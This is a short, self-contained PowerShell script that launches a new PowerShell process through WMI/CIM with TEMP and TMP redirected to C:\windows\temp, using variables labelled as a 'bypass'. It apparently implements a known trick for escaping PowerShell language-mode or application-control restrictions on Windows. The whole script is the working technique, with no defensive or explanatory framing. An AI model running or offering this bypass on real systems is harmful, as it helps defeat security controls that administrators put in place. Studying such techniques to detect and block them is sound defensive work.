#Path to Powershell
$CMDLine = "$PSHOME\powershell.exe"

#Getting existing env vars
[String[]] $EnvVarsExceptTemp = Get-ChildItem Env:\* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }

#Custom TEMP and TMP
$TEMPBypassPath = "Temp=C:\windows\temp"
$TMPBypassPath = "TMP=C:\windows\temp"

#Add the to the list of vars
$EnvVarsExceptTemp += $TEMPBypassPath
$EnvVarsExceptTemp += $TMPBypassPath

#Define the start params
$StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }
$StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties

#Start a new powershell using the new params
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $CMDLine
ProcessStartupInformation = $StartParams
}